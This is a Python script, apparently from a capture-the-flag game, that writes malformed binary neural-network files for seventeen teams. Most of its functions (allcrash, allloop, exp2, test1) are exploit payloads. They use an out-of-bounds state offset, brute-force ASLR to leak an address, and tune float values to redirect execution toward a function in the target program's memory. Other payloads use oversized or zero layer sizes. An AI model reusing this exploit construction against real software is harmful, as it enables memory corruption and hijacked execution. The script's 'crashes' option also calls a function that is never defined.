#!/usr/bin/env python

import os
import shutil
import struct
import binascii


INPUT_FOLDER = "inputs/"


def easyai(hidden_layer_size=12):
    fc = b""
    fc += struct.pack("<I",3) #n inputs
    fc += struct.pack("<I",hidden_layer_size) #hidden layer size
    fc += struct.pack("<I",3) #n outputs

    fc += struct.pack("<I",3) #n states
    fc += struct.pack("<I",0) #state offsets in aistate
    fc += struct.pack("<I",4)
    fc += struct.pack("<I",15)

    fc += struct.pack("<I",1) #ltype1
    fc += struct.pack("<I",1) #ltype2
    fc += struct.pack("<I",1) #ltype3

    fc+= open("weights/easyai_3_12_3_cut", "rb").read()[0x18:]

    return fc


def allexit():
    fc = b""
    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",3) #hidden layer size
    fc += struct.pack("<I",1) #n outputs

    fc += struct.pack("<I",1) #n states
    fc += struct.pack("<I",0) #state offsets in aistate

    fc += struct.pack("<I",1) #ltype1
    fc += struct.pack("<I",1) #ltype2
    fc += struct.pack("<I",1) #ltype3

    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)

    for i in range(1, 17+1):
        with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
            fp.write(fc)

def allcrash():
    fc = b""
    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",1) #hidden layer size
    fc += struct.pack("<I",8) #n outputs

    fc += struct.pack("<I",1) #n states
    fc += struct.pack("<I",226492544) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3


    fc += struct.pack("=f",0.123456)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",60.0)
    fc += struct.pack("=f",-60.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",100.0)

    for i in range(1, 17+1):
        with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
            fp.write(fc)


def allloop():
    fc = b""

    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",2) #hidden layer size
    fc += struct.pack("<I",9) #n outputs

    fc += struct.pack("<I",1) #n states
    leak_off = 226492544
    fc += struct.pack("<I",leak_off) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3

    cc = open("stub", "rb").read()
    off = cc.find(b"\x31\x22\x76\x84")
    vv = off-2075+113 #this offset should bring us for the dummyguy location in the bin to the network_run_wrapper function in memory
    vv += 276+11+(6-1) # + int(sys.argv[2]) #11
    fp_delta = struct.unpack(">f",binascii.unhexlify("3e"+"ff"+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+"ff"+("%04x"%vv)))[0]

    for aslr in range(0,256):
        aslr_str = "%02x" % aslr
        fp_delta = struct.unpack(">f",binascii.unhexlify("3e"+aslr_str+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+aslr_str+("%04x"%vv)))[0]
        leaked = struct.unpack(">f",binascii.unhexlify("3e"+aslr_str+"0011"))[0]
        with open("aslrtests/"+aslr_str, "wb") as fp:
            fp.write(struct.pack("=f",1.0))
            fp.write(struct.pack("=f",leaked))
        print(aslr_str, leaked, fp_delta)

    fc += struct.pack("=f",-0.25) #h11
    fc += struct.pack("=f",-1.0) #i1->h11

    fc += struct.pack("=f",0.0) #h12
    fc += struct.pack("=f",1.0) #i1->h12

    fc += struct.pack("=f",0.0) #h21
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #h22
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",-0.25+fp_delta/2) #-0.00000002 #o1 
    fc += struct.pack("=f",-1.0)
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",fp_delta) #o2
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",0.0) #o3
    fc += struct.pack("=f",0.0) 
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #o4
    fc += struct.pack("=f",0.0) 
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #o5
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0) 

    fc += struct.pack("=f",0.0) #o6
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0) 

    fc += struct.pack("=f",0.0) #o7
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)  

    fc += struct.pack("=f",0.0) #o8
    fc += struct.pack("=f",1000000000.0)
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #o9
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1000.0)


    for i in range(1, 17+1):
        with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
            fp.write(fc)


def normal():
    fc = b""

    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",1) #hidden layer size
    fc += struct.pack("<I",8) #n outputs

    fc += struct.pack("<I",1) #n states
    fc += struct.pack("<I",226492544) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3


    cc = open("stub", "rb").read()
    off = cc.find(b"\x31\x22\x76\x84")
    vv = off-2075+113 #this offset should bring us for the dummyguy location in the bin to the network_run_wrapper function in memory
    fp_delta = struct.unpack(">f",binascii.unhexlify("3e"+"ff"+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+"ff"+("%04x"%vv)))[0]
    print(hex(off), hex(vv), fp_delta)

    fc += struct.pack("=f",fp_delta)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",60.0)
    fc += struct.pack("=f",-60.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",100.0)

    fc += easyai()
    with open(os.path.join(INPUT_FOLDER, "team10"), "wb") as fp:
        fp.write(fc)

    fc = easyai(hidden_layer_size=0xffffffff)
    with open(os.path.join(INPUT_FOLDER, "team2"), "wb") as fp:
        fp.write(fc)

    fc = easyai(hidden_layer_size=0)
    with open(os.path.join(INPUT_FOLDER, "team3"), "wb") as fp:
        fp.write(fc)

    fc = easyai(hidden_layer_size=1)
    with open(os.path.join(INPUT_FOLDER, "team4"), "wb") as fp:
        fp.write(fc)

    fc = easyai(hidden_layer_size=2)
    with open(os.path.join(INPUT_FOLDER, "team5"), "wb") as fp:
        fp.write(fc)

    fc = easyai(hidden_layer_size=3)
    with open(os.path.join(INPUT_FOLDER, "team6"), "wb") as fp:
        fp.write(fc)

    fc = easyai(hidden_layer_size=12)
    with open(os.path.join(INPUT_FOLDER, "team7"), "wb") as fp:
        fp.write(fc)

    exp2()


def alleasy():
    fc = b""

    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",1) #hidden layer size
    fc += struct.pack("<I",8) #n outputs

    fc += struct.pack("<I",1) #n states
    fc += struct.pack("<I",226492544) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3


    cc = open("stub", "rb").read()
    off = cc.find(b"\x31\x22\x76\x84")
    vv = off-2075 #this offset should bring us for the dummyguy location in the bin to the network_run_wrapper function in memory
    fp_delta = struct.unpack(">f",binascii.unhexlify("3e"+"ff"+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+"ff"+("%04x"%vv)))[0]
    print(hex(off), hex(vv), fp_delta)

    fc += struct.pack("=f",fp_delta)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",60.0)
    fc += struct.pack("=f",-60.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",100.0)

    fc += easyai()

    for i in range(1, 17+1):
        with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
            fp.write(fc)


def allshoot():
    fc = b""

    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",1) #hidden layer size
    fc += struct.pack("<I",7) #n outputs

    fc += struct.pack("<I",1) #n states
    fc += struct.pack("<I",0) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3

    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)


    for i in range(1, 17+1):
        with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
            fp.write(fc)


def allempty():
    fc = b""
    for i in range(1, 17+1):
        with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
            fp.write(fc)

def test1():
    fc = b""
    for i in range(1, 17+1):
        with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
            fp.write(fc)

    fc = b""

    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",1) #hidden layer size
    fc += struct.pack("<I",8) #n outputs

    fc += struct.pack("<I",1) #n states
    fc += struct.pack("<I",226492544) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3


    cc = open("stub", "rb").read()
    off = cc.find(b"\x31\x22\x76\x84")
    vv = off-2075+113 #this offset should bring us for the dummyguy location in the bin to the network_run_wrapper function in memory
    fp_delta = struct.unpack(">f",binascii.unhexlify("3e"+"ff"+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+"ff"+("%04x"%vv)))[0]
    print(hex(off), hex(vv), fp_delta)

    fc += struct.pack("=f",fp_delta)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",60.0)
    fc += struct.pack("=f",-60.0)
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",100.0)

    ii = 55
    fc += struct.pack("<I",ii) #n inputs
    fc += struct.pack("<I",64) #hidden layer size
    fc += struct.pack("<I",64) #n outputs

    fc += struct.pack("<I",ii) #n states
    for _ in range(ii):
        fc += struct.pack("<I",3) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3

    for _ in range(50000):
        fc += struct.pack("=f",0.0)

    with open(os.path.join(INPUT_FOLDER, "team1"), "wb") as fp:
        fp.write(fc)


def exp2(yan_stub=False, allt=False):
    fc = b""

    fc += struct.pack("<I",1) #n inputs
    fc += struct.pack("<I",2) #hidden layer size
    fc += struct.pack("<I",9) #n outputs

    fc += struct.pack("<I",1) #n states
    leak_off = 1 if yan_stub else 226492544
    fc += struct.pack("<I",leak_off) #state offsets in aistate #hex((0x38000000+0x200-0x2000000)//4)

    fc += struct.pack("<I",0) #ltype1
    fc += struct.pack("<I",0) #ltype2
    fc += struct.pack("<I",0) #ltype3

    cc = open("stub", "rb").read()
    off = cc.find(b"\x31\x22\x76\x84")
    vv = off-2075+113 #this offset should bring us for the dummyguy location in the bin to the network_run_wrapper function in memory
    fp_delta = struct.unpack(">f",binascii.unhexlify("3e"+"ff"+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+"ff"+("%04x"%vv)))[0]

    for aslr in range(0,256):
        aslr_str = "%02x" % aslr
        fp_delta = struct.unpack(">f",binascii.unhexlify("3e"+aslr_str+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+aslr_str+("%04x"%vv)))[0]
        leaked = struct.unpack(">f",binascii.unhexlify("3e"+aslr_str+"0011"))[0]
        with open("aslrtests/"+aslr_str, "wb") as fp:
            fp.write(struct.pack("=f",1.0))
            fp.write(struct.pack("=f",leaked))
        print(aslr_str, leaked, fp_delta)

    fc += struct.pack("=f",-0.25) #h11
    fc += struct.pack("=f",-1.0) #i1->h11

    fc += struct.pack("=f",0.0) #h12
    fc += struct.pack("=f",1.0) #i1->h12

    fc += struct.pack("=f",0.0) #h21
    fc += struct.pack("=f",1.0)
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #h22
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",-0.25+fp_delta/2) #-0.00000002 #o1 
    fc += struct.pack("=f",-1.0)
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",fp_delta) #o2
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1.0)

    fc += struct.pack("=f",0.0) #o3
    fc += struct.pack("=f",0.0) 
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #o4
    fc += struct.pack("=f",0.0) 
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #o5
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0) 

    fc += struct.pack("=f",0.0) #o6
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0) 

    fc += struct.pack("=f",0.0) #o7
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",0.0)  

    fc += struct.pack("=f",0.0) #o8
    fc += struct.pack("=f",1000000000.0)
    fc += struct.pack("=f",0.0)

    fc += struct.pack("=f",0.0) #o9
    fc += struct.pack("=f",0.0)
    fc += struct.pack("=f",1000.0)

    fc += easyai()

    if allt:
        for i in range(1, 17+1):
            with open(os.path.join(INPUT_FOLDER, "team"+str(i)), "wb") as fp:
                fp.write(fc)
    else:
        with open(os.path.join(INPUT_FOLDER, "team1"), "wb") as fp:
            fp.write(fc)


if __name__ == "__main__":
    import sys

    for f in os.listdir(INPUT_FOLDER):
        if not f.startswith("team"):
            continue
        fname = os.path.join(INPUT_FOLDER, f)
        with open(fname, "wb") as fp:
            pass

    if len(sys.argv) == 1:
        normal()
    elif sys.argv[1] == "crashes":
        crashes()
    elif sys.argv[1] == "allshoot":
        allshoot()
    elif sys.argv[1] == "alleasy":
        alleasy()
    elif sys.argv[1] == "allexit":
        allexit()
    elif sys.argv[1] == "allcrash":
        allcrash()
    elif sys.argv[1] == "allloop":
        allloop()
    elif sys.argv[1] == "allempty":
        allempty()
    elif sys.argv[1] == "test1":
        test1()
    elif sys.argv[1] == "exp2":
        exp2()
    elif sys.argv[1] == "exp2yan":
        exp2(yan_stub=True)
    elif sys.argv[1] == "exp2all":
        exp2(allt=True)
    else:
        print("error!")


'''
for v in range(0, 256):
    vstr = "%02x"%v
    t=struct.unpack(">f",binascii.unhexlify("3e"+vstr+"0011"))[0]-struct.unpack(">f",binascii.unhexlify("3e"+vstr+"0632"))[0]
    print(v, t)

'''